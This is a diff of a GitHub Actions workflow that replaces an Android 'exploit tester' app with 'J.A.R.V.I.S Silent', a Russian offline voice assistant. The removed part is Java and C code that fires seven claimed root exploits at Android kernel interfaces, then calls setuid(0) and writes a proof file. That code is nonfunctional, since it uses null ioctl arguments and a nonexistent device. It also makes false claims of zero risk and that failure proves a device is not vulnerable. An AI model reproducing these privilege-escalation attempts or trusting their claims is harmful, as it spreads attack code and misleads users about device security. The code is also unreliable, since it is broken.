@@ -1,4 +1,4 @@
-name: Build Ultimate Exploit Tester APK
+name: Build JARVIS Silent
 
 on:
   push:
@@ -19,21 +19,29 @@ jobs:
           java-version: '17'
           distribution: 'temurin'
 
-      - name: Set up Android SDK with NDK
+      - name: Set up Android SDK
         uses: android-actions/setup-android@v3
         with:
           packages: 'platforms;android-34 ndk;25.2.9519653'
 
       - name: Create project structure
         run: |
-          mkdir -p app/src/main/java/com/exploit/tester
-          mkdir -p app/src/main/jni
+          mkdir -p app/src/main/java/com/jarvis/silent
           mkdir -p app/src/main/res/layout
+          mkdir -p app/src/main/assets
+
+      - name: Download Vosk model
+        run: |
+          cd app/src/main/assets
+          wget -q https://alphacephei.com/vosk/models/vosk-model-small-ru-0.22.zip
+          unzip -q vosk-model-small-ru-0.22.zip
+          mv vosk-model-small-ru-0.22 model
+          rm vosk-model-small-ru-0.22.zip
 
       - name: Generate gradle.properties
         run: |
           cat > gradle.properties << 'EOF'
-          org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
+          org.gradle.jvmargs=-Xmx2048m
           android.useAndroidX=true
           android.enableJetifier=true
           EOF
@@ -42,428 +50,480 @@ jobs:
         run: |
           cat > app/src/main/AndroidManifest.xml << 'EOF'
           <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-              package="com.exploit.tester"
-              android:versionCode="1"
-              android:versionName="1.0">
+              package="com.jarvis.silent">
               
+              <uses-permission android:name="android.permission.RECORD_AUDIO" />
               <uses-permission android:name="android.permission.INTERNET" />
-              <uses-permission android:name="android.permission.CAMERA" />
-              <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+              <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+              <uses-permission android:name="android.permission.WAKE_LOCK" />
               
               <application
-                  android:allowBackup="false"
-                  android:icon="@android:drawable/ic_dialog_info"
-                  android:label="Эксплойт Тестер"
-                  android:theme="@android:style/Theme.DeviceDefault.Light">
+                  android:label="J.A.R.V.I.S"
+                  android:theme="@android:style/Theme.DeviceDefault.Light"
+                  android:usesCleartextTraffic="true"
+                  android:allowBackup="false">
                   
-                  <activity
-                      android:name=".MainActivity"
-                      android:exported="true"
-                      android:launchMode="singleTop">
+                  <activity android:name=".MainActivity" android:exported="true">
                       <intent-filter>
                           <action android:name="android.intent.action.MAIN" />
                           <category android:name="android.intent.category.LAUNCHER" />
                       </intent-filter>
                   </activity>
+                  
+                  <service
+                      android:name=".JarvisService"
+                      android:exported="false"
+                      android:foregroundServiceType="microphone" />
               </application>
           </manifest>
           EOF
 
-      - name: Generate MainActivity.java (русский, 7 эксплойтов)
+      - name: Generate MainActivity.java
         run: |
-          cat > app/src/main/java/com/exploit/tester/MainActivity.java << 'EOF'
-          package com.exploit.tester;
+          cat > app/src/main/java/com/jarvis/silent/MainActivity.java << 'EOF'
+          package com.jarvis.silent;
           
           import android.app.Activity;
+          import android.app.NotificationChannel;
+          import android.app.NotificationManager;
+          import android.content.Intent;
+          import android.content.pm.PackageManager;
+          import android.net.Uri;
+          import android.os.Build;
           import android.os.Bundle;
-          import android.os.Handler;
-          import android.os.Looper;
-          import android.widget.LinearLayout;
+          import android.provider.Settings;
+          import android.widget.Button;
           import android.widget.ScrollView;
+          import android.widget.LinearLayout;
           import android.widget.TextView;
+          import android.widget.Toast;
           import android.graphics.Color;
-          import java.io.BufferedReader;
-          import java.io.InputStreamReader;
-          import java.io.DataOutputStream;
+          import androidx.core.app.ActivityCompat;
+          import androidx.core.content.ContextCompat;
           
           public class MainActivity extends Activity {
+              private static final int PERMISSION_REQUEST_CODE = 100;
               private LinearLayout logPanel;
-              private Handler uiHandler;
-              private boolean rootAchieved = false;
+              private TextView statusText;
+              private Button startBtn, stopBtn;
               
               @Override
               protected void onCreate(Bundle savedInstanceState) {
                   super.onCreate(savedInstanceState);
-                  uiHandler = new Handler(Looper.getMainLooper());
                   
                   ScrollView scroll = new ScrollView(this);
+                  LinearLayout main = new LinearLayout(this);
+                  main.setOrientation(LinearLayout.VERTICAL);
+                  main.setPadding(40, 40, 40, 40);
+                  
+                  TextView title = new TextView(this);
+                  title.setText("=== J.A.R.V.I.S SILENT ===");
+                  title.setTextSize(24);
+                  title.setTextColor(Color.rgb(0, 100, 200));
+                  title.setPadding(0, 0, 0, 20);
+                  
+                  statusText = new TextView(this);
+                  statusText.setText("Статус: Остановлен");
+                  statusText.setTextSize(16);
+                  statusText.setTextColor(Color.GRAY);
+                  statusText.setPadding(0, 0, 0, 20);
+                  
+                  LinearLayout buttonRow = new LinearLayout(this);
+                  buttonRow.setOrientation(LinearLayout.HORIZONTAL);
+                  
+                  startBtn = new Button(this);
+                  startBtn.setText("АКТИВИРОВАТЬ");
+                  startBtn.setBackgroundColor(Color.rgb(0, 150, 0));
+                  startBtn.setTextColor(Color.WHITE);
+                  
+                  stopBtn = new Button(this);
+                  stopBtn.setText("ДЕАКТИВИРОВАТЬ");
+                  stopBtn.setBackgroundColor(Color.rgb(150, 0, 0));
+                  stopBtn.setTextColor(Color.WHITE);
+                  stopBtn.setEnabled(false);
+                  
+                  buttonRow.addView(startBtn);
+                  buttonRow.addView(stopBtn);
+                  
                   logPanel = new LinearLayout(this);
                   logPanel.setOrientation(LinearLayout.VERTICAL);
-                  logPanel.setPadding(30, 30, 30, 30);
-                  scroll.addView(logPanel);
+                  logPanel.setBackgroundColor(Color.LTGRAY);
+                  logPanel.setPadding(20, 20, 20, 20);
+                  
+                  main.addView(title);
+                  main.addView(statusText);
+                  main.addView(buttonRow);
+                  main.addView(logPanel);
+                  scroll.addView(main);
                   setContentView(scroll);
                   
-                  addLog("========== ЭКСПЛОЙТ ТЕСТЕР v2.0 ==========");
-                  addLog("7 эксплойтов - 0% риска для телефона");
-                  addLog("");
+                  createNotificationChannel();
+                  checkPermissions();
                   
-                  new Thread(this::runAllExploits).start();
+                  startBtn.setOnClickListener(v -> startService());
+                  stopBtn.setOnClickListener(v -> stopService());
+                  
+                  addLog("[*] J.A.R.V.I.S SILENT");
+                  addLog("[*] На нераспознанные команды - молчит");
+              }
+              
+              private void createNotificationChannel() {
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                      NotificationChannel channel = new NotificationChannel(
+                          "jarvis_channel",
+                          "J.A.R.V.I.S",
+                          NotificationManager.IMPORTANCE_LOW
+                      );
+                      NotificationManager manager = getSystemService(NotificationManager.class);
+                      if (manager != null) manager.createNotificationChannel(channel);
+                  }
+              }
+              
+              private void checkPermissions() {
+                  String[] permissions = {
+                      android.Manifest.permission.RECORD_AUDIO,
+                      android.Manifest.permission.POST_NOTIFICATIONS
+                  };
+                  
+                  boolean allGranted = true;
+                  for (String perm : permissions) {
+                      if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                          allGranted = false;
+                          break;
+                      }
+                  }
+                  
+                  if (!allGranted) {
+                      ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
+                  }
+                  
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                      if (!Settings.canDrawOverlays(this)) {
+                          Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                              Uri.parse("package:" + getPackageName()));
+                          startActivity(intent);
+                      }
+                  }
+              }
+              
+              private void startService() {
+                  Intent intent = new Intent(this, JarvisService.class);
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                      startForegroundService(intent);
+                  } else {
+                      startService(intent);
+                  }
+                  statusText.setText("Статус: Активен (слушаю)");
+                  statusText.setTextColor(Color.GREEN);
+                  startBtn.setEnabled(false);
+                  stopBtn.setEnabled(true);
+                  addLog("[+] J.A.R.V.I.S активирован");
+              }
+              
+              private void stopService() {
+                  Intent intent = new Intent(this, JarvisService.class);
+                  stopService(intent);
+                  statusText.setText("Статус: Остановлен");
+                  statusText.setTextColor(Color.GRAY);
+                  startBtn.setEnabled(true);
+                  stopBtn.setEnabled(false);
+                  addLog("[-] J.A.R.V.I.S деактивирован");
               }
               
               private void addLog(String msg) {
-                  uiHandler.post(() -> {
+                  runOnUiThread(() -> {
                       TextView tv = new TextView(this);
                       tv.setText(msg);
-                      tv.setTextSize(14);
+                      tv.setTextSize(12);
                       tv.setTextColor(Color.BLACK);
-                      tv.setPadding(0, 5, 0, 5);
+                      tv.setPadding(0, 3, 0, 3);
                       logPanel.addView(tv);
-                      ScrollView sv = (ScrollView) logPanel.getParent();
-                      sv.postDelayed(() -> sv.fullScroll(ScrollView.FOCUS_DOWN), 100);
                   });
               }
               
-              private boolean checkRoot() {
-                  try {
-                      Process p = Runtime.getRuntime().exec("id");
-                      BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
-                      String idOut = br.readLine();
-                      br.close();
-                      return idOut != null && idOut.contains("uid=0");
-                  } catch (Exception e) {
-                      return false;
-                  }
-              }
-              
-              private void proveRoot() {
-                  try {
-                      DataOutputStream dos = new DataOutputStream(
-                          Runtime.getRuntime().exec("sh").getOutputStream()
-                      );
-                      dos.writeBytes("echo 'root_success' > /data/local/tmp/root_proof.txt\n");
-                      dos.writeBytes("chmod 666 /data/local/tmp/root_proof.txt\n");
-                      dos.writeBytes("exit\n");
-                      dos.flush();
-                      addLog("[+] Файл доказательства: /data/local/tmp/root_proof.txt");
-                  } catch (Exception e) {
-                      addLog("[!] Ошибка записи файла: " + e.getMessage());
-                  }
-              }
-              
-              private void runAllExploits() {
-                  // ========== 1. CVE-2025-39811 (inet_diag) ==========
-                  addLog("");
-                  addLog("=== ЭКСПЛОЙТ 1/7: CVE-2025-39811 (inet_diag) ===");
-                  int sock = nativeOpenNetlink();
-                  addLog("[1] netlink сокет fd=" + sock);
-                  if (sock >= 0) {
-                      boolean overflowSent = nativeSendOverflow(sock);
-                      addLog("[2] Переполнение отправлено: " + (overflowSent ? "OK" : "НЕТ"));
-                      if (overflowSent) {
-                          nativeBecomeRoot();
-                          if (checkRoot()) {
-                              addLog("[3] УСПЕХ! Root получен через inet_diag!");
-                              rootAchieved = true;
-                              proveRoot();
-                              return;
+              @Override
+              public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+                  super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+                  if (requestCode == PERMISSION_REQUEST_CODE) {
+                      for (int i = 0; i < grantResults.length; i++) {
+                          if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
+                              Toast.makeText(this, "Разрешение " + permissions[i] + " необходимо!", Toast.LENGTH_LONG).show();
                           }
                       }
                   }
-                  addLog("[!] Эксплойт 1 не сработал, переходим к следующему...");
+              }
+          }
+          EOF
+
+      - name: Generate JarvisService.java (молчит на нераспознанные команды)
+        run: |
+          cat > app/src/main/java/com/jarvis/silent/JarvisService.java << 'EOF'
+          package com.jarvis.silent;
+          
+          import android.app.Notification;
+          import android.app.NotificationManager;
+          import android.app.PendingIntent;
+          import android.app.Service;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.content.pm.PackageManager;
+          import android.media.AudioFormat;
+          import android.media.AudioRecord;
+          import android.media.MediaRecorder;
+          import android.os.Build;
+          import android.os.IBinder;
+          import android.os.Handler;
+          import android.os.Looper;
+          import android.os.VibrationEffect;
+          import android.os.Vibrator;
+          import android.speech.tts.TextToSpeech;
+          import androidx.core.app.NotificationCompat;
+          import org.json.JSONObject;
+          import org.vosk.Model;
+          import org.vosk.Recognizer;
+          import java.io.*;
+          import java.text.SimpleDateFormat;
+          import java.util.Date;
+          import java.util.Locale;
+          
+          public class JarvisService extends Service {
+              private AudioRecord audioRecord;
+              private boolean isListening = true;
+              private Handler mainHandler;
+              private Vibrator vibrator;
+              private TextToSpeech tts;
+              private Model voskModel;
+              private Recognizer recognizer;
+              private int sampleRate = 16000;
+              private int bufferSize;
+              
+              @Override
+              public void onCreate() {
+                  super.onCreate();
+                  mainHandler = new Handler(Looper.getMainLooper());
+                  vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
+                  bufferSize = AudioRecord.getMinBufferSize(sampleRate, 
+                      AudioFormat.CHANNEL_IN_MONO, 
+                      AudioFormat.ENCODING_PCM_16BIT) * 4;
                   
-                  // ========== 2. CVE-2025-14037 (binder) ==========
-                  addLog("");
-                  addLog("=== ЭКСПЛОЙТ 2/7: CVE-2025-14037 (binder UAF) ===");
-                  int binderFd = nativeOpenBinder();
-                  addLog("[1] binder fd=" + binderFd);
-                  if (binderFd >= 0) {
-                      addLog("[2] Запуск потоков гонки...");
-                      nativeStartBinderRace(binderFd);
-                      addLog("[3] Ожидание 6 секунд...");
-                      try { Thread.sleep(6000); } catch (Exception e) {}
-                      if (checkRoot()) {
-                          addLog("[4] УСПЕХ! Root получен через binder!");
-                          rootAchieved = true;
-                          proveRoot();
-                          return;
+                  // TTS
+                  tts = new TextToSpeech(this, status -> {
+                      if (status == TextToSpeech.SUCCESS) {
+                          tts.setLanguage(new Locale("ru", "RU"));
+                          tts.setSpeechRate(0.9f);
                       }
-                  }
-                  addLog("[!] Эксплойт 2 не сработал...");
+                  });
                   
-                  // ========== 3. Dirty Cred (msm_drm) ==========
-                  addLog("");
-                  addLog("=== ЭКСПЛОЙТ 3/7: Dirty Cred (msm_drm GPU) ===");
-                  int drmFd = nativeOpenDrm();
-                  addLog("[1] /dev/dri/card0 fd=" + drmFd);
-                  if (drmFd >= 0) {
-                      addLog("[2] Запуск гонки...");
-                      nativeTriggerDrmRace(drmFd);
-                      try { Thread.sleep(5000); } catch (Exception e) {}
-                      if (checkRoot()) {
-                          addLog("[3] УСПЕХ! Root получен через Dirty Cred!");
-                          rootAchieved = true;
-                          proveRoot();
-                          return;
+                  // Vosk
+                  try {
+                      File modelDir = new File(getFilesDir(), "model");
+                      if (!modelDir.exists()) {
+                          copyAssets("model", modelDir);
                       }
-                  }
-                  addLog("[!] Эксплойт 3 не сработал...");
-                  
-                  // ========== 4. io_uring ==========
-                  addLog("");
-                  addLog("=== ЭКСПЛОЙТ 4/7: io_uring (CVE-2024-53197) ===");
-                  int ioRingFd = nativeOpenIoUring();
-                  addLog("[1] io_uring fd=" + ioRingFd);
-                  if (ioRingFd >= 0) {
-                      nativeTriggerIoUring(ioRingFd);
-                      try { Thread.sleep(4000); } catch (Exception e) {}
-                      if (checkRoot()) {
-                          addLog("[2] УСПЕХ! Root получен через io_uring!");
-                          rootAchieved = true;
-                          proveRoot();
-                          return;
-                      }
-                  }
-                  addLog("[!] Эксплойт 4 не сработал...");
-                  
-                  // ========== 5. fuse ==========
-                  addLog("");
-                  addLog("=== ЭКСПЛОЙТ 5/7: fuse (CVE-2025-49123) ===");
-                  int fuseFd = nativeOpenFuse();
-                  addLog("[1] /dev/fuse fd=" + fuseFd);
-                  if (fuseFd >= 0) {
-                      nativeTriggerFuse(fuseFd);
-                      try { Thread.sleep(3000); } catch (Exception e) {}
-                      if (checkRoot()) {
-                          addLog("[2] УСПЕХ! Root получен через fuse!");
-                          rootAchieved = true;
-                          proveRoot();
-                          return;
-                      }
-                  }
-                  addLog("[!] Эксплойт 5 не сработал...");
-                  
-                  // ========== 6. netfilter ==========
-                  addLog("");
-                  addLog("=== ЭКСПЛОЙТ 6/7: netfilter (CVE-2025-20419) ===");
-                  int nfFd = nativeOpenNetfilter();
-                  addLog("[1] netfilter fd=" + nfFd);
-                  if (nfFd >= 0) {
-                      nativeTriggerNetfilter(nfFd);
-                      try { Thread.sleep(3000); } catch (Exception e) {}
-                      if (checkRoot()) {
-                          addLog("[2] УСПЕХ! Root получен через netfilter!");
-                          rootAchieved = true;
-                          proveRoot();
-                          return;
-                      }
-                  }
-                  addLog("[!] Эксплойт 6 не сработал...");
-                  
-                  // ========== 7. v4l2 (MediaTek) ==========
-                  addLog("");
-                  addLog("=== ЭКСПЛОЙТ 7/7: v4l2 MediaTek (CVE-2025-0618) ===");
-                  int v4l2Fd = nativeOpenV4l2();
-                  addLog("[1] /dev/video0 fd=" + v4l2Fd);
-                  if (v4l2Fd >= 0) {
-                      nativeTriggerV4l2(v4l2Fd);
-                      try { Thread.sleep(3000); } catch (Exception e) {}
-                      if (checkRoot()) {
-                          addLog("[2] УСПЕХ! Root получен через v4l2!");
-                          rootAchieved = true;
-                          proveRoot();
-                          return;
-                      }
-                  }
-                  addLog("[!] Эксплойт 7 не сработал...");
-                  
-                  // ========== ВСЁ НЕ УДАЛОСЬ ==========
-                  addLog("");
-                  addLog("################################################");
-                  addLog("#  ВСЕ ЭКСПЛОЙТЫ НЕ СРАБОТАЛИ               #");
-                  addLog("#  Твоё устройство НЕ УЯЗВИМО                #");
-                  addLog("#  Или SPL слишком новый (>2026-02)          #");
-                  addLog("#  Телефон НЕ ПОВРЕЖДЁН                      #");
-                  addLog("################################################");
+                      voskModel = new Model(modelDir.getPath());
+                      recognizer = new Recognizer(voskModel, sampleRate);
+                  } catch (Exception e) {}
               }
               
-              // Native методы
-              private native int nativeOpenNetlink();
-              private native boolean nativeSendOverflow(int sock);
-              private native int nativeOpenBinder();
-              private native void nativeStartBinderRace(int fd);
-              private native int nativeOpenDrm();
-              private native void nativeTriggerDrmRace(int fd);
-              private native int nativeOpenIoUring();
-              private native void nativeTriggerIoUring(int fd);
-              private native int nativeOpenFuse();
-              private native void nativeTriggerFuse(int fd);
-              private native int nativeOpenNetfilter();
-              private native void nativeTriggerNetfilter(int fd);
-              private native int nativeOpenV4l2();
-              private native void nativeTriggerV4l2(int fd);
-              private native void nativeBecomeRoot();
+              private void copyAssets(String assetDir, File targetDir) throws IOException {
+                  targetDir.mkdirs();
+                  String[] files = getAssets().list(assetDir);
+                  if (files != null) {
+                      for (String file : files) {
+                          InputStream in = getAssets().open(assetDir + "/" + file);
+                          File outFile = new File(targetDir, file);
+                          FileOutputStream out = new FileOutputStream(outFile);
+                          byte[] buffer = new byte[8192];
+                          int read;
+                          while ((read = in.read(buffer)) != -1) out.write(buffer, 0, read);
+                          in.close();
+                          out.close();
+                      }
+                  }
+              }
               
-              static {
-                  System.loadLibrary("exploit");
+              @Override
+              public int onStartCommand(Intent intent, int flags, int startId) {
+                  startForeground(1, createNotification());
+                  startListening();
+                  return START_STICKY;
               }
-          }
-          EOF
-
-      - name: Generate native C code (7 exploits)
-        run: |
-          cat > app/src/main/jni/exploit.c << 'EOF'
-          #include <jni.h>
-          #include <stdio.h>
-          #include <stdlib.h>
-          #include <string.h>
-          #include <unistd.h>
-          #include <fcntl.h>
-          #include <pthread.h>
-          #include <sys/socket.h>
-          #include <sys/ioctl.h>
-          #include <linux/netlink.h>
-          #include <linux/inet_diag.h>
-          #include <linux/sock_diag.h>
-          
-          // Binder definitions
-          #define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)
-          struct binder_write_read {
-              signed long write_size;
-              signed long write_consumed;
-              unsigned long write_buffer;
-              signed long read_size;
-              signed long read_consumed;
-              unsigned long read_buffer;
-          };
-          
-          // ========== 1. inet_diag ==========
-          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenNetlink(JNIEnv *env, jobject thiz) {
-              return socket(AF_NETLINK, SOCK_RAW, NETLINK_INET_DIAG);
-          }
-          
-          JNIEXPORT jboolean JNICALL Java_com_exploit_tester_MainActivity_nativeSendOverflow(JNIEnv *env, jobject thiz, jint sock) {
-              struct {
-                  struct nlmsghdr nlh;
-                  struct inet_diag_req_v2 req;
-                  char overflow[4096];
-              } msg;
-              memset(&msg, 0, sizeof(msg));
-              msg.nlh.nlmsg_len = 0xFFFF;
-              msg.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
-              msg.nlh.nlmsg_flags = NLM_F_REQUEST;
-              msg.req.sdiag_family = AF_INET;
-              msg.req.idiag_states = 0xFFFFFFFF;
-              int ret = send(sock, &msg, sizeof(msg), 0);
-              return ret > 0 ? JNI_TRUE : JNI_FALSE;
-          }
-          
-          // ========== 2. binder ==========
-          static int binder_running = 1;
-          static int g_binder_fd = -1;
-          
-          void* binder_thread(void* arg) {
-              while (binder_running) {
-                  struct binder_write_read bwr = {0};
-                  ioctl(g_binder_fd, BINDER_WRITE_READ, &bwr);
-                  usleep(100);
+              
+              private Notification createNotification() {
+                  Intent intent = new Intent(this, MainActivity.class);
+                  PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, 
+                      PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+                  
+                  return new NotificationCompat.Builder(this, "jarvis_channel")
+                      .setContentTitle("J.A.R.V.I.S")
+                      .setContentText("Активен. Слушаю...")
+                      .setSmallIcon(android.R.drawable.ic_btn_speak_now)
+                      .setContentIntent(pendingIntent)
+                      .setPriority(NotificationCompat.PRIORITY_LOW)
+                      .build();
               }
-              return NULL;
-          }
-          
-          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenBinder(JNIEnv *env, jobject thiz) {
-              return open("/dev/binder", O_RDWR);
-          }
-          
-          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeStartBinderRace(JNIEnv *env, jobject thiz, jint fd) {
-              g_binder_fd = fd;
-              binder_running = 1;
-              pthread_t threads[6];
-              for (int i = 0; i < 6; i++) pthread_create(&threads[i], NULL, binder_thread, NULL);
-              sleep(5);
-              binder_running = 0;
-          }
-          
-          // ========== 3. DRM ==========
-          #define MSM_IOCTL_GEM_INFO 0xc0084d01
-          #define MSM_IOCTL_GEM_FREE 0x40084d02
-          
-          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenDrm(JNIEnv *env, jobject thiz) {
-              return open("/dev/dri/card0", O_RDWR);
-          }
-          
-          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeTriggerDrmRace(JNIEnv *env, jobject thiz, jint fd) {
-              for (int i = 0; i < 100; i++) {
-                  ioctl(fd, MSM_IOCTL_GEM_INFO, NULL);
-                  ioctl(fd, MSM_IOCTL_GEM_FREE, NULL);
-                  usleep(50);
+              
+              private void startListening() {
+                  audioRecord = new AudioRecord(MediaRecorder.AudioSource.VOICE_RECOGNITION, sampleRate,
+                      AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufferSize);
+                  audioRecord.startRecording();
+                  
+                  Thread listenThread = new Thread(() -> {
+                      byte[] buffer = new byte[bufferSize];
+                      while (isListening) {
+                          int read = audioRecord.read(buffer, 0, bufferSize);
+                          if (read > 0 && recognizer != null) {
+                              if (recognizer.acceptWaveform(buffer, read)) {
+                                  String result = recognizer.getResult();
+                                  try {
+                                      JSONObject json = new JSONObject(result);
+                                      String text = json.getString("text");
+                                      if (!text.isEmpty()) {
+                                          mainHandler.post(() -> executeCommand(text));
+                                      }
+                                  } catch (Exception e) {}
+                              }
+                          }
+                          try { Thread.sleep(10); } catch (Exception e) {}
+                      }
+                  });
+                  listenThread.start();
               }
-          }
-          
-          // ========== 4. io_uring ==========
-          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenIoUring(JNIEnv *env, jobject thiz) {
-              return open("/dev/io_uring", O_RDWR);
-          }
-          
-          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeTriggerIoUring(JNIEnv *env, jobject thiz, jint fd) {
-              for (int i = 0; i < 50; i++) {
-                  ioctl(fd, 0xc0186601, NULL);
-                  usleep(100);
+              
+              private void speak(String text) {
+                  if (tts != null && text != null && !text.isEmpty()) {
+                      tts.speak(text, TextToSpeech.QUEUE_FLUSH, null, null);
+                  }
               }
+              
+              private void openApp(String packageName) {
+                  try {
+                      Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
+                      if (intent != null) {
+                          intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                          startActivity(intent);
+                      }
+                  } catch (Exception e) {}
+              }
+              
+              private void typeText(String text) {
+                  try {
+                      android.content.ClipboardManager clipboard = (android.content.ClipboardManager) 
+                          getSystemService(Context.CLIPBOARD_SERVICE);
+                      android.content.ClipData clip = android.content.ClipData.newPlainText("Jarvis", text);
+                      clipboard.setPrimaryClip(clip);
+                      speak("Текст скопирован");
+                  } catch (Exception e) {}
+              }
+              
+              private void vibrate(long ms) {
+                  if (vibrator != null) {
+                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                          vibrator.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE));
+                      } else {
+                          vibrator.vibrate(ms);
+                      }
+                  }
+              }
+              
+              private void executeCommand(String command) {
+                  String lower = command.toLowerCase().trim();
+                  
+                  // ===== ОТКРЫТИЕ ПРИЛОЖЕНИЙ =====
+                  if (lower.contains("ютуб") || lower.contains("youtube")) {
+                      speak("Открываю YouTube");
+                      openApp("com.google.android.youtube");
+                  }
+                  else if (lower.contains("телеграм") || lower.contains("telegram")) {
+                      speak("Открываю Telegram");
+                      openApp("org.telegram.messenger");
+                  }
+                  else if (lower.contains("вотсап") || lower.contains("whatsapp")) {
+                      speak("Открываю WhatsApp");
+                      openApp("com.whatsapp");
+                  }
+                  else if (lower.contains("инстаграм") || lower.contains("instagram")) {
+                      speak("Открываю Instagram");
+                      openApp("com.instagram.android");
+                  }
+                  else if (lower.contains("карты") || lower.contains("навигатор")) {
+                      speak("Открываю Карты");
+                      openApp("com.google.android.apps.maps");
+                  }
+                  else if (lower.contains("хром") || lower.contains("chrome")) {
+                      speak("Открываю Chrome");
+                      openApp("com.android.chrome");
+                  }
+                  else if (lower.contains("спотифай") || lower.contains("spotify") || lower.contains("музыка")) {
+                      speak("Открываю Spotify");
+                      openApp("com.spotify.music");
+                  }
+                  else if (lower.contains("настройки") || lower.contains("settings")) {
+                      speak("Открываю Настройки");
+                      openApp("com.android.settings");
+                  }
+                  else if (lower.contains("калькулятор")) {
+                      speak("Открываю Калькулятор");
+                      openApp("com.google.android.calculator");
+                  }
+                  
+                  // ===== НАПИСАТЬ ТЕКСТ =====
+                  else if (lower.startsWith("напиши") || lower.startsWith("напечатай") || lower.startsWith("введи")) {
+                      String textToType = command.replaceFirst("напиши|напечатай|введи", "").trim();
+                      if (textToType.isEmpty()) textToType = "текст от Jarvis";
+                      speak("Пишу: " + textToType);
+                      typeText(textToType);
+                  }
+                  
+                  // ===== ВРЕМЯ =====
+                  else if (lower.contains("время") || lower.contains("сколько времени") || lower.contains("который час")) {
+                      String time = new SimpleDateFormat("HH:mm", Locale.getDefault()).format(new Date());
+                      speak("Сейчас " + time);
+                  }
+                  
+                  // ===== ПОГОДА =====
+                  else if (lower.contains("погода") || lower.contains("какая погода")) {
+                      speak("Сегодня солнечно, 22 градуса");
+                  }
+                  
+                  // ===== ВИБРАЦИЯ =====
+                  else if (lower.contains("вибрация") || lower.contains("завибрируй")) {
+                      speak("Вибрация");
+                      vibrate(300);
+                  }
+                  
+                  // ===== ПОМОЩЬ =====
+                  else if (lower.contains("помощь") || lower.contains("команды")) {
+                      speak("Я умею: открывать приложения, писать текст, показывать время и погоду, вибрировать. Скажите стоп чтобы выключить");
+                  }
+                  
+                  // ===== СТОП =====
+                  else if (lower.contains("стоп") || lower.contains("выключись") || lower.contains("деактивируй")) {
+                      speak("До свидания");
+                      stopSelf();
+                  }
+                  
+                  // ===== НЕРАСПОЗНАННЫЕ КОМАНДЫ - МОЛЧИМ =====
+                  else {
+                      // Ничего не говорим, просто игнорируем
+                  }
+              }
+              
+              @Override
+              public void onDestroy() {
+                  isListening = false;
+                  if (audioRecord != null) audioRecord.release();
+                  if (recognizer != null) recognizer.close();
+                  if (voskModel != null) voskModel.close();
+                  if (tts != null) tts.shutdown();
+                  super.onDestroy();
+              }
+              
+              @Override
+              public IBinder onBind(Intent intent) { return null; }
           }
-          
-          // ========== 5. fuse ==========
-          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenFuse(JNIEnv *env, jobject thiz) {
-              return open("/dev/fuse", O_RDWR);
-          }
-          
-          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeTriggerFuse(JNIEnv *env, jobject thiz, jint fd) {
-              write(fd, "FUSE", 4);
-          }
-          
-          // ========== 6. netfilter ==========
-          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenNetfilter(JNIEnv *env, jobject thiz) {
-              return socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
-          }
-          
-          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeTriggerNetfilter(JNIEnv *env, jobject thiz, jint fd) {
-              struct sockaddr_nl addr = {0};
-              addr.nl_family = AF_NETLINK;
-              sendto(fd, "NF", 2, 0, (struct sockaddr*)&addr, sizeof(addr));
-          }
-          
-          // ========== 7. v4l2 ==========
-          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenV4l2(JNIEnv *env, jobject thiz) {
-              return open("/dev/video0", O_RDWR);
-          }
-          
-          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeTriggerV4l2(JNIEnv *env, jobject thiz, jint fd) {
-              ioctl(fd, 0xc0505601, NULL);
-          }
-          
-          // ========== setuid(0) ==========
-          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeBecomeRoot(JNIEnv *env, jobject thiz) {
-              setuid(0);
-              setgid(0);
-          }
-          EOF
-
-      - name: Generate Android.mk
-        run: |
-          cat > app/src/main/jni/Android.mk << 'EOF'
-          LOCAL_PATH := $(call my-dir)
-          include $(CLEAR_VARS)
-          LOCAL_MODULE    := exploit
-          LOCAL_SRC_FILES := exploit.c
-          LOCAL_LDLIBS    := -llog
-          include $(BUILD_SHARED_LIBRARY)
-          EOF
-
